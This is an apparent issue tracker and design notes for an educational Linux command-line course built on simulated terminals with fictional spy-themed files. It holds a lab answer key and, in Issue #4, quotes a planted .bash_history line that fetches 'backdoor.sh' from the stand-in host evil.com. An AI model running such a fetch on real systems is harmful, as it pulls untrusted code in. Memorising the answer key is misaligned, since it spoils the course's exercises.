# CLH Course - Issue Tracker

**Course:** Hacker's Guide to Linux (CLH-001 through CLH-015)
**Location:** `_app/houses/script/clh/`
**Created:** January 15, 2026

---

## Open Issues

### ~~Issue #1: Missing `intel` directory in CLH-002 lab~~ → RESOLVED
- **Status:** ✅ Fixed January 15, 2026
- **See:** Resolved Issues section below

### Issue #2: Missing source files in CLH-002 virtual filesystem
- **Module:** CLH-002 (Navigation & Reconnaissance)
- **File:** `clh-002-intro.html`
- **Problem:** Chapter 2 source bundle contains 5 practice files, but CLH-002 only implements 3.
- **Missing files:**
  - `LongScript.sh.txt` - Bash script demo (50 lines)
  - `system.log.txt` - Kernel/systemd logs (46 lines)
- **Implemented:** MeetingNotes.txt, MyFavoriteRecipe.txt, ProjectReport.txt
- **Status:** Open
- **Fix:** Consider adding missing files to virtual filesystem for richer lab experience.

### Issue #3: Content sanitization/simplification
- **Module:** CLH-002 (Navigation & Reconnaissance)
- **Problem:** Source content is more detailed than what's implemented.
- **Example:** Source `MeetingNotes.txt` contains 43 lines of detailed red team operation planning (recon, exploitation, exfiltration). CLH-002 version is simplified to generic "security upgrades" content.
- **Status:** Open - Review if intentional
- **Question:** Was this intentional sanitization, or should CLH-002 use the richer source content?

---

## Resolved Issues

### Issue #16: CLH-001 filesystem broken ✅
- **Resolved:** January 16, 2026
- **Module:** CLH-001 (Introduction to Hacker CLI)
- **Root Cause:** Same nested `contents` structure bug as CLH-002 through CLH-008
- **Fix:** Converted to flat `children` structure:
  - `/home/operator` with children: `['Documents', 'missions', 'scripts', 'tools', '.bashrc', '.bash_history', '.classified']`
  - All subdirectories and files as separate flat entries
  - Added thematic spy content: OPERATION SILENT ECHO, asset codenames, handler notes
  - Hidden `.classified` file with dead drop coordinates
- **File:** `_app/houses/script/applets/linux/clh-001-intro-to-hacker-cli.html`
- **Deployed:** ✅ Firebase hosting updated

### Issue #1: Missing `intel` directory in CLH-002 lab ✅
- **Resolved:** January 15, 2026
- **Root Cause:** Filesystem structure mismatch. The lab was using nested `contents` objects, but `LinuxTerminal.js` expects a flat structure with `children` arrays.
- **Fix:** Rewrote the filesystem definition in `clh-002-navigation-recon.html` to use the correct flat structure:
  - Each path is a separate key in `terminal.fs`
  - Uses `children` arrays for directories
  - Uses proper `perms`, `owner`, `group`, `size` properties
  - Added `/home` children update to include `operator`
  - Added hidden `.secret.txt` with nuke launch codes for recon discovery
- **File:** `_app/houses/script/applets/linux/clh-002-navigation-recon.html`
- **Deployed:** Firebase hosting updated
- **Verified:** Full lab flow working (ls, cd intel, ls -la reveals hidden files, cat .secret.txt)

### Issue #10: CLH-003 filesystem broken - ls shows nothing ✅
- **Resolved:** January 15, 2026
- **Module:** CLH-003 (Pattern Hunting)
- **Root Cause:** Same as Issue #1 - using nested `contents` objects instead of flat `children` arrays.
- **Fix:** Rewrote filesystem in `clh-003-pattern-hunting.html`:
  - `/home/operator` with children: `['evidence', 'tools', '.bash_history']`
  - `/home/operator/evidence` with children: `['mystery.txt', 'notes.txt', 'README.txt']`
  - `/home/operator/tools` with children: `['search.sh']`
  - All files as flat entries with proper `perms`, `owner`, `group`, `size`, `content`
- **File:** `_app/houses/script/applets/linux/clh-003-pattern-hunting.html`
- **Content:** UFO sighting/alien abduction report (CONTACT-2847)
- **Deployed:** ✅

### Issue #11: CLH-004 filesystem broken ✅
- **Resolved:** January 15, 2026
- **Module:** CLH-004 (Process Investigation)
- **Fix:** Converted nested `contents` to flat `children` structure
- **Content Theme:** Black site monitoring station "SHADOW MESA"
  - Processes: `signal_intercept`, `facial_recog_daemon`, `sat_uplink_monitor`, `drone_telemetry`
  - Hidden `.incident_log` with breach timeline
- **File:** `_app/houses/script/applets/linux/clh-004-process-investigation.html`
- **Deployed:** ✅

### Issue #12: CLH-005 filesystem broken + JS syntax error ✅
- **Resolved:** January 15, 2026
- **Module:** CLH-005 (Log Analysis)
- **Root Cause:** Nested `contents` + leftover log content outside template literal caused JS crash
- **Fix:** Flat structure + removed orphaned content
- **Content Theme:** Deep space monitoring / SETI black project
  - Signal from Cygnus X-1 quadrant
  - ERROR entries flag extrasolar origin
  - Event: CONTACT-2847
  - Hidden `.classified_memo` with star map intel
- **File:** `_app/houses/script/applets/linux/clh-005-log-analysis.html`
- **Deployed:** ✅

### Issue #13: CLH-006 filesystem broken ✅
- **Resolved:** January 15, 2026
- **Module:** CLH-006 (File Operations)
- **Fix:** Flat `children` structure
- **Content Theme:** OPERATION SHADOWSTRIKE
  - Field assets in Berlin, Moscow, Tehran
  - Numbers station intercept (UVB-76 adjacent)
  - Hidden `.dead_drop` with brush pass coordinates
- **File:** `_app/houses/script/applets/linux/clh-006-file-operations.html`
- **Deployed:** ✅

### Issue #14: CLH-007 filesystem broken ✅
- **Resolved:** January 15, 2026
- **Module:** CLH-007 (Permissions)
- **Fix:** Flat `children` structure
- **Content Theme:** PROJECT LOOKING GLASS / DARPA blacksite
  - Temporal comm array encryption keys
  - Sublevel 7 monitoring array
  - Self-destruct code: ECHO-SEVEN-NINER
  - Hidden `.shadow_network` with compromised node
- **File:** `_app/houses/script/applets/linux/clh-007-permissions.html`
- **Deployed:** ✅

### Issue #15: CLH-008 filesystem broken ✅
- **Resolved:** January 15, 2026
- **Module:** CLH-008 (Shell Scripting)
- **Fix:** Flat `children` structure
- **Content Theme:** Field operative scripts
  - SILENT WITNESS recon script
  - Dead drop backup protocol
  - Emergency broadcast system
  - Asset status: MOCKINGBIRD burned, RAVEN active
  - Hidden `.exfil_protocol` with NYC dead drop coords
- **File:** `_app/houses/script/applets/linux/clh-008-shell-scripting.html`
- **Deployed:** ✅

---

## Exploration Findings (January 15, 2026)

### Source Bundle Structure
The CLH course is adapted from the "Command Line Hacker" eBook.

```
Command Line Hacker Bundle/
├── Comand Line Hacker - ORIGINAL eBook (3).pdf  ← Main source (3.7MB PDF)
└── Free Bonuses/
    ├── 10 Command Line Tips.pdf
    ├── Kali Linux Command Line Cheat Sheet.pdf
    ├── Shell Script Creation Checklist.pdf
    ├── Shell Script Creation Template.pdf
    └── Exercises/
        ├── Exercises for Linux Chapter 1-16.pdf  ← Per-chapter exercise PDFs
        └── Practice Files For Exercises/
            ├── Chapter 2/   ← Maps to CLH-002
            ├── Chapter 4/   ← Contains breach.pcap
            ├── Chapter 5/   ← Contains mystery.txt
            ├── Chapter 6/   ← CPU process analysis
            ├── Chapter 9/   ← Text processing files
            ├── Chapter 11/  ← Large log files (Linux.log, Zookeeper.log)
            └── Chapter 12/  ← MySQL sample database
```

### Chapter 2 Practice Files (CLH-002 Source)
| Source File | In CLH-002? | Notes |
|-------------|-------------|-------|
| MeetingNotes.txt | Yes (simplified) | Source has 43 lines of red team content |
| MyFavoriteRecipe.txt | Yes | Likely unchanged |
| ProjectReport.txt.txt | Yes (simplified) | Source has 24 lines |
| LongScript.sh.txt | **NO** | 50-line bash script demo |
| system.log.txt | **NO** | 46-line kernel/systemd log |

### Two Lab Systems in Hexworth Prime
1. **CLH Course** (`_app/houses/script/clh/`)
   - 15 modules: clh-001-intro.html through clh-015-intro.html
   - Based on Command Line Hacker eBook chapters
   - Embedded virtual filesystem in each module

2. **Linux Labs** (`_app/houses/script/applets/linux/`)
   - Uses LINUX_LAB_TEMPLATE.md pattern
   - Two-panel design (terminal + learning guide)
   - CompTIA Linux+ focused
   - Different naming: linux-lab-XXX-topic.html

### Key Insight: intel Directory
The `intel` directory is NOT in the source material. This means:
- It was a custom Hexworth addition that was planned but not implemented
- OR it's referenced in the Chapter 2 exercises PDF (would need to check PDF)
- Decision needed: What should `intel` contain?

---

## CLH 001-004 Module Analysis (January 15, 2026)

### Module Overview

| Module | Title | Key Commands | Lab Type |
|--------|-------|--------------|----------|
| CLH-001 | Introduction to the Hacker CLI | `whoami`, `pwd`, `ls -la`, `id`, `hostname`, `uname -a` | Sandbox terminal |
| CLH-002 | Navigation & Reconnaissance | `cd`, `ls`, `find`, `cat`, `tree`, `locate` | Virtual filesystem |
| CLH-003 | Network Analysis Fundamentals | `tcpdump`, `tshark` | PCAP analysis |
| CLH-004 | Text Analysis & Pattern Hunting | `grep`, regex patterns | Mystery file search |

### Achievement Tiers
- **CLI Recruit:** CLH-001 through CLH-003
- **CLI Analyst:** CLH-004 through CLH-006

---

## Additional Issues Discovered

### Issue #4: Sharp difficulty jump between CLH-001 and CLH-002
- **Problem:** CLH-001 is beginner "hello world" level (whoami, pwd, ls, id). CLH-002 suddenly contains:
  - `.bash_history` with `wget http://evil.com/backdoor.sh`
  - `notes.txt` with literal password: "Summer2025!"
  - Hidden configs with db_password
- **Impact:** May overwhelm beginners; content escalation too steep
- **Status:** Open
- **Suggestion:** Consider intermediate content or softer introduction in CLH-002

### Issue #5: Inconsistent terminal prompts across modules
- **Problem:** Each module uses different prompt conventions:
  - CLH-001: `hacker@sandbox:~$`
  - CLH-002: `user@target:~$`
  - CLH-003: `forensics$`
  - CLH-004: `$`
- **Impact:** No unified identity; breaks immersion
- **Status:** Open
- **Suggestion:** Standardize to `student@hexworth:~$` or similar

### Issue #6: Inconsistent objective tracking logic
- **Problem:** Completion requirements vary:
  - CLH-001: 4 objectives, all must complete
  - CLH-002: 3 discovery points (less formal)
  - CLH-003: 3 discoveries with boolean flags
  - CLH-004: Single grep trigger
- **Impact:** Uneven difficulty perception; inconsistent UX
- **Status:** Open
- **Suggestion:** Standardize objective system across all modules

### Issue #7: No filesystem continuity in CLH-003/004
- **Problem:** CLH-001 and CLH-002 use virtual filesystem simulation. CLH-003 switches to PCAP-only analysis. CLH-004 uses single mystery.txt file.
- **Impact:** Skills from CLH-002 (navigation) not reinforced; feels disconnected
- **Status:** Open
- **Suggestion:** Consider having CLH-003/004 start with "find the file" before analysis

### Issue #8: PCAP specification mismatch (minor)
- **Module:** CLH-003
- **Problem:** Claims 5.2 MB file with 12,847 packets. Typical PCAP is ~1MB per 10,000 packets. Should be ~1.3-1.5 MB.
- **Impact:** Minor documentation inaccuracy
- **Status:** Open (low priority)

### Issue #9: Tier progression unclear
- **Problem:** Modules reference "CLI Recruit" (001-003) and "CLI Analyst" (004-006) but:
  - No explanation of what each tier means
  - No visible progression indicator
  - Unknown what 007+ tiers are called
- **Impact:** Achievement system feels incomplete
- **Status:** Open
- **Suggestion:** Document full tier system; add progression UI

---

## Proposed Solution: Centralized CLH Terminal Simulator

**Date:** January 15, 2026
**Status:** Under consideration

### Current Architecture (Embedded)
Each `clh-xxx-intro.html` contains its own:
- Virtual filesystem object (~80 lines)
- Command handlers (~150 lines)
- Prompt logic
- Objective tracking

**Result:** ~300 lines of duplicated code × 15 modules = maintenance nightmare

### Proposed Architecture (Centralized)
Create shared component: `_app/components/CLHTerminal.js`

```
CLHTerminal.js
├── Base filesystem (always present)
│   ├── /home/student/
│   ├── /etc/
│   ├── /var/log/
│   └── /tmp/
├── Module overlays (each lab adds specific content)
├── Shared command handlers (ls, cd, cat, grep, find, etc.)
├── Consistent prompt: student@hexworth:~$
└── Progress/objective tracking hooks
```

### How Modules Would Use It
```javascript
// clh-002-intro.html (simplified)
CLHTerminal.init({
    module: 'CLH-002',
    overlay: {
        '/home/student/intel': { type: 'dir', contents: ['target-info.txt', 'network-map.txt'] }
    },
    objectives: [
        { id: 1, task: 'List home directory', check: (cmd) => cmd.startsWith('ls') },
        { id: 2, task: 'Navigate to intel', check: (state) => state.cwd.includes('intel') },
        { id: 3, task: 'Read target info', check: (cmd) => cmd.includes('cat') && cmd.includes('target') }
    ]
});
```

### Benefits
| Aspect | Embedded (Current) | Centralized (Proposed) |
|--------|-------------------|------------------------|
| Bug fixes | Edit 15 files | Edit 1 file |
| Consistent prompts | No (Issue #5) | Yes |
| Filesystem continuity | No (Issue #7) | Yes |
| Code per module | ~300 lines | ~50 lines |
| Add new command | 15 edits | 1 edit |

### Issues This Would Resolve
- Issue #1: intel directory (simple overlay)
- Issue #5: Inconsistent prompts (standardized)
- Issue #6: Inconsistent objective tracking (unified system)
- Issue #7: No filesystem continuity (base + overlays)

### Trade-offs
- **Upfront cost:** Refactoring 15 modules
- **Dependency:** Modules now require CLHTerminal.js
- **Complexity:** Slightly more complex architecture

### Progress Tracking Integration

**Existing Systems (no need to reinvent):**
- `ModuleProgress.js` — handles completion, streaks, achievements
- `TrailHunter.js` — handles trail-based discovery with Patronus guide
- Both use `localStorage` for persistence

**How CLHTerminal hooks in:**

```javascript
// CLHTerminal.js initialization
CLHTerminal.init({
    module: 'CLH-002',
    houseId: 'script',
    prerequisites: ['clh-001'],  // Sequential unlocking
    overlay: { /* filesystem additions */ },
    objectives: [ /* tasks */ ],
    onComplete: () => {
        ModuleProgress.complete('script', 'clh-002');
    }
});
```

**On module load:**
1. Check `ModuleProgress.isCompleted('script', 'clh-001')` for prerequisites
2. If prerequisites NOT met → show lock screen with guidance
3. If prerequisites met → initialize terminal with module config

**On all objectives complete:**
1. Trigger success animation
2. Call `ModuleProgress.complete('script', 'clh-XXX')`
3. Next module auto-unlocks (checked on its load)

**Tier achievements (CLI Recruit, CLI Analyst, etc.):**
- CLHTerminal tracks completion count
- On milestones (3, 6, 9, 12, 15) → trigger tier achievement via `AchievementManager`

**Benefits of this approach:**
- Leverages existing `ModuleProgress` infrastructure
- Dashboard already displays progress from this system
- Streaks and achievements work automatically
- No duplicate progress tracking code

### File Structure Decision

**Chosen approach:** Option A + C (Thin wrappers + Config registry)

**Components to create:**
1. `_app/components/CLHTerminal.js` — The simulator engine
2. `_app/components/CLHConfig.js` — Central config registry for all 15 modules

**CLHConfig.js structure:**
```javascript
const CLH_MODULES = {
    'CLH-001': {
        title: 'Introduction to the Hacker CLI',
        prerequisites: [],
        prompt: 'student@hexworth:~$',
        objectives: [...],
        filesystem: {...}
    },
    'CLH-002': {
        title: 'Navigation & Reconnaissance',
        prerequisites: ['CLH-001'],
        prompt: 'student@hexworth:~$',
        objectives: [...],
        filesystem: {...},
        overlay: { '/home/student/intel': {...} }
    },
    // ... CLH-003 through CLH-015
};
```

**Each HTML file becomes a thin wrapper (~20 lines):**
```html
<!-- clh-002-intro.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script src="../../../components/AccessGuard.js"></script>
    <script>AccessGuard.require('sorted');</script>
    <title>CLH-002: Navigation & Reconnaissance</title>
</head>
<body>
    <script src="../../../components/CLHTerminal.js"></script>
    <script src="../../../components/CLHConfig.js"></script>
    <script>CLHTerminal.init('CLH-002');</script>
</body>
</html>
```

**Benefits:**
- No URL changes (existing links work)
- Single source of truth for all module configs
- Easy to add/modify modules
- Gradual migration possible (one module at a time)
- Consistent prompt across all modules (`student@hexworth:~$`)

---

### Decision Needed
Proceed with centralized approach before fixing individual issues?

---

---

## QC Sweep Results (2026-01-19) - v2.90.0

### Summary
Full QC sweep completed across all CLH labs (001-017). Applied standardized checklist:
1. Filesystem richness (10+ files minimum)
2. Hidden cheatsheet (`.xxx_cheatsheet`)
3. Helpful `.bash_history`
4. Output validation on objectives
5. Insight Phase with findable answers

### Lab-by-Lab Results

| Lab | Files | Cheatsheet | Output Val | Insight Phase | Fix Applied |
|-----|-------|------------|------------|---------------|-------------|
| CLH-001 | 15 | `.cli_cheatsheet` | 5/5 | N/A (intro) | Added cheatsheet, cat objective, output validation |
| CLH-002 | 15 | `.navigation_cheatsheet` | 3/5 (2 state-based OK) | SHADOWRUN | Added cheatsheet, output validation, Insight Phase |
| CLH-003 | 12 | `.grep_cheatsheet` | 5/5 | 42XDFL | Expanded 7→12 files, added cheatsheet, Insight Phase |
| CLH-004 | 10+ | `.process_cheatsheet` | 3/5 | unknown_process | Added cheatsheet, reports dir, output validation |
| CLH-005 | 10+ | `.log_cheatsheet` | 5/5 | extrasolar | Added cheatsheet, output validation |
| CLH-006 | 10+ | `.fileops_cheatsheet` | 5/5 | owl flies at midnight | Added cheatsheet, backup dir |
| CLH-007 | 10+ | `.permissions_cheatsheet` | 5/5 | gamma | Added cheatsheet, .bash_history, fixed duplicate obj |
| CLH-008 | 10+ | `.scripting_cheatsheet` | 5/5 | coordinates | Added cheatsheet, updated .bash_history |
| CLH-009 | 30+ | `.text_processing_cheatsheet` | 5/5 | 10.0.0.88 | Added cheatsheet (already excellent) |
| CLH-010 | 13 | `.redirect_cheatsheet` | 5/5 | 192.168.1.105 | Already QC'd - no changes |
| CLH-011 | 10 | `.grep_cheatsheet` | 5/5 | 6 (FAILED count) | Already QC'd - no changes |
| CLH-012 | 11 | `.network_cheatsheet` | 5/5 | 3306 (mysql) | Added scripts dir (2 files) |
| CLH-013 | 11 | `.env_cheatsheet` | 5/5 | ll (alias) | Expanded 6→11 files |
| CLH-014 | 10 | `.process_cheatsheet` | 4/5 (jobs cmd OK) | rogue_agent | Already QC'd - no changes |
| CLH-015 | 10 | `.investigation_cheatsheet` | 5/5 | 10.0.0.88 | Added tools, reports dirs (3 files) |
| CLH-016 | 10+ | `.sysinfo_cheatsheet` | 5/5 | iron harvest | Already QC'd - no changes |
| CLH-017 | 15+ | `.find_cheatsheet` | 5/5 | 4444 (port) | Already QC'd - no changes |

### QC Standards Applied

#### 1. Filesystem Richness (10+ files)
Each lab must have a realistic environment with:
- Multiple directories (logs/, intel/, scripts/, reports/, etc.)
- At least 2 hidden files
- Content that supports objectives

#### 2. Hidden Cheatsheet
Every lab has a discoverable `.xxx_cheatsheet` file containing:
- Command reference for the lab topic
- Usage examples
- Common options/flags

#### 3. Helpful .bash_history
Instead of suspicious commands, `.bash_history` now contains:
- Hints for completing objectives
- Example commands relevant to the lab topic
- Discoverable with `cat .bash_history`

#### 4. Output Validation
Objectives use 3-parameter check pattern:
```javascript
check: (cmd, state, output) =>
    cmd.includes('grep') &&
    output && output.includes('expected_content')
```
**Exceptions:** Navigation commands (cd) appropriately use state-based checks.

#### 5. Insight Phase
Post-objectives question requiring synthesis:
- Question findable in filesystem
- Multiple answer formats accepted (case variations)
- Hint provided after 3 failed attempts
- Custom wrong/correct messages

### Known Issues Discovered During QC

#### Issue #17: Pipe Output Display Bug (FIXED v2.78.0)
- **Problem:** Piped commands showed ALL intermediate outputs
- **Example:** `cat file | grep pattern` showed both cat output AND grep output
- **Fix:** Modified SecurityTerminal.js to only display final pipe stage result
- **Status:** ✅ FIXED

#### Issue #18: CLH-007 Duplicate Objectives (FIXED v2.86.0)
- **Problem:** Objectives 1 and 4 were identical (`ls -la secure/`)
- **Fix:** Changed objective 4 to use `stat` command instead
- **Status:** ✅ FIXED

#### Issue #19: CLH-007 Missing .bash_history
- **Problem:** Children array didn't include .bash_history at all
- **Fix:** Added .bash_history to children and created file definition
- **Status:** ✅ FIXED

#### Issue #20: Export Commands - No Output Validation
- **Problem:** `export VAR=value` doesn't produce output in real shells
- **Decision:** Command-only checks are appropriate for export commands
- **Status:** By Design (not a bug)

### Insight Phase Answers Reference

| Lab | Question | Answer | Location |
|-----|----------|--------|----------|
| CLH-002 | Vault password | SHADOWRUN | intel/.secret.txt |
| CLH-003 | Secret code in evidence | 42XDFL | evidence/mystery.txt |
| CLH-004 | Unknown process name | unknown_process | analysis/ files |
| CLH-005 | Signal origin | extrasolar | logs/ files |
| CLH-006 | Dead drop phrase | owl flies at midnight | Hidden file |
| CLH-007 | Project codename | gamma | secure/ files |
| CLH-008 | Coordinates | (varies) | scripts/ files |
| CLH-009 | Attacker IP | 10.0.0.88 | logs/ files |
| CLH-010 | Monitor IP | 192.168.1.105 | intel/notes.txt |
| CLH-011 | Failed login count | 6 | logs/auth.log |
| CLH-012 | Database port | 3306 | intel/scan_results.txt |
| CLH-013 | Bash alias | ll | .bashrc |
| CLH-014 | Cryptominer process | rogue_agent | intel/processes.txt |
| CLH-015 | Attacker IP | 10.0.0.88 | /evidence/timeline.txt |
| CLH-016 | Operation codename | iron harvest | intel/notes.txt |
| CLH-017 | Backdoor port | 4444 | /home/analyst/.backdoor.sh |

---

## Content Guidelines

**ALL CLH lab files should contain thematic content from these categories:**
- Spy/espionage operations (dead drops, agent communications, classified intel)
- Fringe sci-fi (UFO sightings, alien abductions, unexplained phenomena)
- Conspiracy theories (government cover-ups, secret programs, black sites)
- Hacker culture (intercepted transmissions, leaked documents, encrypted messages)

**NO generic lorem ipsum or bland placeholder text.**

The content should feel like students are uncovering actual classified/forbidden material - makes the labs more immersive and engaging.

**Example (CLH-003 mystery.txt):** Classified UFO incident report with alien abduction, radar anomalies, and government cover-up.

---

## Notes

- Virtual file system is defined in JavaScript within each intro.html file
- Lab objectives display is in the terminal output initialization (around line 612-623 in CLH-002)

### Flexbox Scrolling Fix (January 18, 2026)
**Issue:** Content inside flex children won't scroll even with `overflow-y: auto`

**Cause:** Flexbox default `min-height: auto` prevents containers from shrinking below content size, so there's no height constraint for overflow to work against.

**Fix:** Add `min-height: 0` to the flex container parent:
```css
.flex-parent {
    display: flex;
    flex-direction: column;
    min-height: 0;  /* Critical for child overflow scrolling */
}
```

**Applied to:** `linux-command-simulator.html` → `.terminal-section` (v2.58.0)

---

## Source Content

**Raw content location:**
```
\\wsl.localhost\Ubuntu\home\eq\Ai content creation\Linux\Linux\clh\Command Line Hacker Bundle
```

The intro.html files are massive because they contain embedded interactive labs. Reference the source bundle above for original course content and structure.

**Terminal Simulator Template:**
```
\\wsl.localhost\Ubuntu\home\eq\Ai content creation\Hexworth Prime\_planning\LINUX_LAB_TEMPLATE.md
```

Reference this template for the interactive terminal simulator architecture used in CLH labs.

